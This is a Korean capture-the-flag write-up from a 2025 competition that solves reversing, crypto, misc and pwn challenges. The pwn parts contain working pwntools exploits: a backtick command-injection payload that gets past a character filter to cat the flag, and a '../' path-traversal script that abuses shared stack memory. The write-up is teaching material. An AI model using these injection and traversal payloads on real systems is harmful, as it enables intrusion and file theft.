
# 2025SSUCTF | 좌천된 오은총 실력을 숨기고 싶다 ~두 번 환생한 최강해커, 이번 생에선 편해지고 싶어서 대충 하다가, otnws에서 추방당했다. 이제 와서 돌아오라고 해도 늦었어, 켄텍에게 실력이 들통나서, 친가로 돌려보내 주지 않으니까…~ | 조수호
# rev / Mazer

HxD로 main.exe를 까보면
```
main__ module.
�Could not get __main__ module's dict.
��%s%c%s.py�������Absolute path to script exceeds PATH_MAX
�������__file__��������Failed to unmarshal code object for %s
�_pyi_main_co����pyi-disable-windowed-traceback��Traceback is disabled via bootloader option.����_MEIPASS2�������_PYI_ONEDIR_MODE
```

python으로 구동한다는 사실을 알 수 있다.(이 전까지 IDA를 2시간 동안 바라보았다.)

main.exe > main.pyc 해주었다. main.pyc > main.py는 github 코드가 작동하지 않길래 어셈을 보고 읽어줬다.

```
None
        [Code]
            File Name: main.py
            Object Name: xor_image_hash
            Qualified Name: xor_image_hash
            Arg Count: 4
            Pos Only Arg Count: 0
            KW Only Arg Count: 0
            Stack Size: 6
            Flags: 0x00000003 (CO_OPTIMIZED | CO_NEWLOCALS)
            [Names]
                'hashlib'
                'sha256'
                'open'
                'update'
                'read'
                'hexdigest'
            [Locals+Names]
                'frog_path'
                'wall_path'
                'floor_path'
                'statue_path'
                'hasher'
                'f'
            [Constants]
                None
                'rb'
                16
            [Disassembly]
                0       RESUME                          0
                2       LOAD_GLOBAL                     1: NULL + hashlib
                14      LOAD_ATTR                       1: sha256
                24      PRECALL                         0
                28      CALL                            0
                38      STORE_FAST                      4: hasher
                40      LOAD_GLOBAL                     5: NULL + open
                52      LOAD_FAST                       0: frog_path
                54      LOAD_CONST                      1: 'rb'
                56      PRECALL                         2
                60      CALL                            2
                70      BEFORE_WITH                     
                72      STORE_FAST                      5: f
                74      LOAD_FAST                       4: hasher
                76      LOAD_METHOD                     3: update
                98      LOAD_FAST                       5: f
                100     LOAD_METHOD                     4: read
                122     PRECALL                         0
                126     CALL                            0
                136     PRECALL                         1
                140     CALL                            1
                150     POP_TOP                         
                152     LOAD_CONST                      0: None
                154     LOAD_CONST                      0: None
                156     LOAD_CONST                      0: None
                158     PRECALL                         2
                162     CALL                            2
                172     POP_TOP                         
                174     JUMP_FORWARD                    11 (to 198)
                176     PUSH_EXC_INFO                   
                178     WITH_EXCEPT_START               
                180     POP_JUMP_FORWARD_IF_TRUE        4 (to 190)
                182     RERAISE                         2
                184     COPY                            3
                186     POP_EXCEPT                      
                188     RERAISE                         1
                190     POP_TOP                         
                192     POP_EXCEPT                      
                194     POP_TOP                         
                196     POP_TOP                         
                198     LOAD_GLOBAL                     5: NULL + open
                210     LOAD_FAST                       1: wall_path
                212     LOAD_CONST                      1: 'rb'
                214     PRECALL                         2
                218     CALL                            2
                228     BEFORE_WITH                     
                230     STORE_FAST                      5: f
                232     LOAD_FAST                       4: hasher
                234     LOAD_METHOD                     3: update
                256     LOAD_FAST                       5: f
                258     LOAD_METHOD                     4: read
                280     PRECALL                         0
                284     CALL                            0
                294     PRECALL                         1
                298     CALL                            1
                308     POP_TOP                         
                310     LOAD_CONST                      0: None
                312     LOAD_CONST                      0: None
                314     LOAD_CONST                      0: None
                316     PRECALL                         2
                320     CALL                            2
                330     POP_TOP                         
                332     JUMP_FORWARD                    11 (to 356)
                334     PUSH_EXC_INFO                   
                336     WITH_EXCEPT_START               
                338     POP_JUMP_FORWARD_IF_TRUE        4 (to 348)
                340     RERAISE                         2
                342     COPY                            3
                344     POP_EXCEPT                      
                346     RERAISE                         1
                348     POP_TOP                         
                350     POP_EXCEPT                      
                352     POP_TOP                         
                354     POP_TOP                         
                356     LOAD_GLOBAL                     5: NULL + open
                368     LOAD_FAST                       2: floor_path
                370     LOAD_CONST                      1: 'rb'
                372     PRECALL                         2
                376     CALL                            2
                386     BEFORE_WITH                     
                388     STORE_FAST                      5: f
                390     LOAD_FAST                       4: hasher
                392     LOAD_METHOD                     3: update
                414     LOAD_FAST                       5: f
                416     LOAD_METHOD                     4: read
                438     PRECALL                         0
                442     CALL                            0
                452     PRECALL                         1
                456     CALL                            1
                466     POP_TOP                         
                468     LOAD_CONST                      0: None
                470     LOAD_CONST                      0: None
                472     LOAD_CONST                      0: None
                474     PRECALL                         2
                478     CALL                            2
                488     POP_TOP                         
                490     JUMP_FORWARD                    11 (to 514)
                492     PUSH_EXC_INFO                   
                494     WITH_EXCEPT_START               
                496     POP_JUMP_FORWARD_IF_TRUE        4 (to 506)
                498     RERAISE                         2
                500     COPY                            3
                502     POP_EXCEPT                      
                504     RERAISE                         1
                506     POP_TOP                         
                508     POP_EXCEPT                      
                510     POP_TOP                         
                512     POP_TOP                         
                514     LOAD_GLOBAL                     5: NULL + open
                526     LOAD_FAST                       3: statue_path
                528     LOAD_CONST                      1: 'rb'
                530     PRECALL                         2
                534     CALL                            2
                544     BEFORE_WITH                     
                546     STORE_FAST                      5: f
                548     LOAD_FAST                       4: hasher
                550     LOAD_METHOD                     3: update
                572     LOAD_FAST                       5: f
                574     LOAD_METHOD                     4: read
                596     PRECALL                         0
                600     CALL                            0
                610     PRECALL                         1
                614     CALL                            1
                624     POP_TOP                         
                626     LOAD_CONST                      0: None
                628     LOAD_CONST                      0: None
                630     LOAD_CONST                      0: None
                632     PRECALL                         2
                636     CALL                            2
                646     POP_TOP                         
                648     JUMP_FORWARD                    11 (to 672)
                650     PUSH_EXC_INFO                   
                652     WITH_EXCEPT_START               
                654     POP_JUMP_FORWARD_IF_TRUE        4 (to 664)
                656     RERAISE                         2
                658     COPY                            3
                660     POP_EXCEPT                      
                662     RERAISE                         1
                664     POP_TOP                         
                666     POP_EXCEPT                      
                668     POP_TOP                         
                670     POP_TOP                         
                672     LOAD_FAST                       4: hasher
                674     LOAD_METHOD                     5: hexdigest
                696     PRECALL                         0
                700     CALL                            0
                710     LOAD_CONST                      0: None
                712     LOAD_CONST                      2: 16
                714     BUILD_SLICE                     2
                716     BINARY_SUBSCR                   
                726     RETURN_VALUE       
```
xor_image_hash에서는 4장의 사진을 불러와 sha256.update() 해주는 것을 알 수 있다. 마지막에 16바이트만 뽑아내는 것도 잊지 않는다.

```
[Code]
            File Name: main.py
            Object Name: make_flag
            Qualified Name: make_flag
            Arg Count: 0
            Pos Only Arg Count: 0
            KW Only Arg Count: 0
            Stack Size: 6
            Flags: 0x00000003 (CO_OPTIMIZED | CO_NEWLOCALS)
            [Names]
                'xor_image_hash'
            [Locals+Names]
                'frog_file'
                'wall_file'
                'floor_file'
                'statue_file'
                'result'
                'flag'
            [Constants]
                None
                'chill.jpeg'
                'wall.jpg'
                'tile.jpg'
                'flag.png'
                'ssu{'
                '}'
            [Disassembly]
                0       RESUME                          0
                2       LOAD_CONST                      1: 'chill.jpeg'
                4       STORE_FAST                      0: frog_file
                6       LOAD_CONST                      2: 'wall.jpg'
                8       STORE_FAST                      1: wall_file
                10      LOAD_CONST                      3: 'tile.jpg'
                12      STORE_FAST                      2: floor_file
                14      LOAD_CONST                      4: 'flag.png'
                16      STORE_FAST                      3: statue_file
                18      LOAD_GLOBAL                     1: NULL + xor_image_hash
                30      LOAD_FAST                       0: frog_file
                32      LOAD_FAST                       1: wall_file
                34      LOAD_FAST                       2: floor_file
                36      LOAD_FAST                       3: statue_file
                38      PRECALL                         4
                42      CALL                            4
                52      STORE_FAST                      4: result
                54      LOAD_CONST                      5: 'ssu{'
                56      LOAD_FAST                       4: result
                58      BINARY_OP                       0 (+)
                62      LOAD_CONST                      6: '}'
                64      BINARY_OP                       0 (+)
                68      STORE_FAST                      5: flag
                70      LOAD_FAST                       5: flag
                72      RETURN_VALUE 
```
result가 곧 flag인데, 이는 위에서 보았던 xor_image_hash를 이용한다. 따라서 아래와 같이 exploit을 짜 해결한다.

![[Pasted image 20250125183042.png]]

```python
import hashlib

def xor_image_hash(frog_path, wall_path, floor_path, statue_path):
    hasher = hashlib.sha256()
    
    # Read and hash each image file
    for path in [frog_path, wall_path, floor_path, statue_path]:
        with open(path, 'rb') as f:
            hasher.update(f.read())
    
    # Return first 16 characters of the hash
    return hasher.hexdigest()[:16]

result = xor_image_hash('chill.jpeg', 'wall.jpg', 'tile.jpg', 'flag.png')
flag = f'ssu{{{result}}}'
print(flag)
```

# crypto / aesvm

AES 작동 순서를 20번 바꿀 기회를 준다. SB만 다 뒤로 옮겨주면 앞의 30개는 선형성이 생기기 때문에 xor로 답을 구해낼 수 있고, 뒤의 SB 10개는 s_box와 inv_s_box를 모두 알기 때문에 flag를 알아낼 수 있다.

![[Pasted image 20250125182956.png]]![[Pasted image 20250125183020.png]]

```python
                word.append(word.pop(0))

                # Apply S-box transformation to all bytes.
                word = [s_box[b] for b in word]

                # XOR the output of the rcon operation with i to the first byte.
                word[0] ^= r_con[i]
                i += 1

            # For 256-bit keys, apply an extra sbox transform on the 4th word.
            if len(master_key) == 32 and len(key_columns) % iteration_size == 4:
                word = [s_box[b] for b in word]

            # XOR with equivalent word from previous iteration.
            word = xor_bytes(word, key_columns[-iteration_size])
            key_columns.append(word)

        # Group key words in 4x4 byte matrices.
        return [key_columns[i : i + 4] for i in range(0, len(key_columns), 4)]

    def encrypt_block(self, plaintext):
        """
        Encrypts a single block of 16-byte long plaintext.
        """
        assert len(plaintext) == 16

        plain_state = bytes2matrix(plaintext)

        add_round_key(plain_state, self._key_matrices[0])

        for i in range(1, self.n_rounds):
            sub_bytes(plain_state)
            shift_rows(plain_state)
            mix_columns(plain_state)
            add_round_key(plain_state, self._key_matrices[i])

        sub_bytes(plain_state)
        shift_rows(plain_state)
        add_round_key(plain_state, self._key_matrices[-1])

        return matrix2bytes(plain_state)

    def decrypt_block(self, ciphertext):
        """
        Decrypts a single block of 16-byte long ciphertext.
        """
        assert len(ciphertext) == 16

        cipher_state = bytes2matrix(ciphertext)

        add_round_key(cipher_state, self._key_matrices[-1])
        inv_shift_rows(cipher_state)
        sub_bytes(cipher_state, sbox=inv_s_box)

        for i in range(self.n_rounds - 1, 0, -1):
            add_round_key(cipher_state, self._key_matrices[i])
            inv_mix_columns(cipher_state)
            inv_shift_rows(cipher_state)
            sub_bytes(cipher_state, sbox=inv_s_box)

        add_round_key(cipher_state, self._key_matrices[0])

        return matrix2bytes(cipher_state)

    def encrypt(self, plaintext):
        """
        Encrypts `plaintext` using AES in ECB mode.
        """
        plaintext = pad(plaintext)
        blocks = split_blocks(plaintext)
        encrypted_blocks = [self.encrypt_block(block) for block in blocks]
        return b"".join(encrypted_blocks)

    def decrypt(self, ciphertext):
        """
        Decrypts `ciphertext` using AES in ECB mode.
        """
        blocks = split_blocks(ciphertext)
        decrypted_blocks = [self.decrypt_block(block) for block in blocks]
        plaintext = b"".join(decrypted_blocks)
        padding_len = plaintext[-1]
        return plaintext[:-padding_len]

# Example usage:
if __name__ == "__main__":
    key = b"This is a key123"
    plaintext = b"This is a secret message!"

    aes = AESVM(key)
    ciphertext = aes.encrypt(plaintext)
    print("Ciphertext:", ciphertext)

    decrypted = aes.decrypt(ciphertext)
    print("Decrypted:", decrypted)
```

# misc / compressor

입력 값과 gzip 해제한 값이 같으면 flag를 준다. 그런데 그냥 엔터치면 둘 다 b""이라서 flag를 받을 수 있다.

![[Pasted image 20250125183214.png]]
# pwn / $ SSU SHELL

```C
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char command[272]; // [rsp+0h] [rbp-320h] BYREF
  char v5[256]; // [rsp+110h] [rbp-210h] BYREF
  char s[268]; // [rsp+210h] [rbp-110h] BYREF
  unsigned int v7; // [rsp+31Ch] [rbp-4h]

  v7 = 0;
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("[+] SSU Echo Shell [+]");
  printf("$ ");
  if ( fgets(s, 256, stdin) )
  {
    s[strcspn(s, "\n")] = 0;
    sub_11F0(s, v5);
    snprintf(command, 0x105uLL, "echo '%s'", v5);
    system(command);
  }
  else
  {
    fprintf(stderr, "Error reading input\n");
    return 1;
  }
  return v7;
}
```
입력을 system 실행시켜준다. command injection이 발생한다.

```C
__int64 __fastcall sub_11F0(__int64 a1, __int64 a2)
{
  __int64 v2; // rcx
  __int64 result; // rax
  bool v4; // [rsp+Fh] [rbp-21h]
  unsigned __int64 i; // [rsp+10h] [rbp-20h]
  __int64 v6; // [rsp+18h] [rbp-18h]

  v6 = 0LL;
  for ( i = 0LL; ; ++i )
  {
    v4 = 0;
    if ( *(_BYTE *)(a1 + i) )
      v4 = i < 0xFF;
    if ( !v4 )
      break;
    if ( (sub_11B0((unsigned int)*(char *)(a1 + i)) & 1) == 0 )
    {
      v2 = v6++;
      *(_BYTE *)(a2 + v2) = *(_BYTE *)(a1 + i);
    }
  }
  result = a2;
  *(_BYTE *)(a2 + v6) = 0;
  return result;
}
```
그런데 약간의 검증이 있다. 이 함수에 걸러지는 문자는 아래와 같다.

```python
for i in range(0x20, 0x7e):
    if ((1 << (i & 0x1F)) & 0x58000054) != 0:
        print(chr(i))

"
$
&
;
<
>
B
D
F
[
\
^
b
d
f
{
|
```
$이 막혔지만 백틱으로 인라인 커맨드를 해낼 수 있다. 아래와 같이 해결한다. system이기 때문에 와일드카드도 작동한다.
![[Pasted image 20250125183539.png]]
```python
from pwn import *

p = remote('ssuctf.kr', 10027)
#p = process('./shell')
p.sendlineafter(b'$ ', b"'`cat ./*lag_*`'")
p.interactive()
```

# uni

유니콘 에뮬레이터로 돌아가는데 딱히 이걸로 인한 특징은 없는 것 같다.

start 함수로부터 다른 함수가 호출된다.

```C
__int64 echo()
{
  _BYTE v1[512]; // [rsp+0h] [rbp-200h] BYREF

  print("echo : ");
  read_input(v1, 512LL);
  print(v1);
  return print("\n");
}
```
echo에서 0x200만큼 쓸 수 있다.

```C
__int64 read_file()
{
  _BYTE v1[48]; // [rsp+0h] [rbp-140h] BYREF
  _BYTE v2[268]; // [rsp+30h] [rbp-110h] BYREF
  int v3; // [rsp+13Ch] [rbp-4h]

  get_filename(v1);
  print(v1);
  print("\n");
  v3 = open(v1, 0LL);
  if ( v3 < 0 )
    return print("No Such file\n");
  read((unsigned int)v3, v2, 256LL);
  print("==== fileContent : ");
  print(v2);
  print("\n");
  return close((unsigned int)v3);
}
```

파일을 읽을 수 있다. 근데 get_filename에서 flag는 거른다. 그렇지만 echo함수와 스택은 공유되는 상황이었기 때문에 v1에는 `../../home../` 처럼 폴더 왔다갔다를 반복하고, echo에서 flag 경로를 마무리하여 파일을 읽어준다.

![[Pasted image 20250125184125.png]]

```python
from pwn import *

p = remote('ssuctf.kr', 10477)

def wt(filename, content):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', filename)
    p.sendlineafter(b': ', content)

def rd(filename):
    p.sendlineafter(b'> ', b'2')
    p.sendafter(b': ', filename)
    p.interactive()
    p.recvuntil(b': ')
    return p.recvline()[:-1]

def ec(payload):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', payload)

ec(b'0123456789abcdef' * 15 + b'ser/flag')
print(rd(b'../../../home/../home/../home/../home/ctf_u'))
p.interactive()
```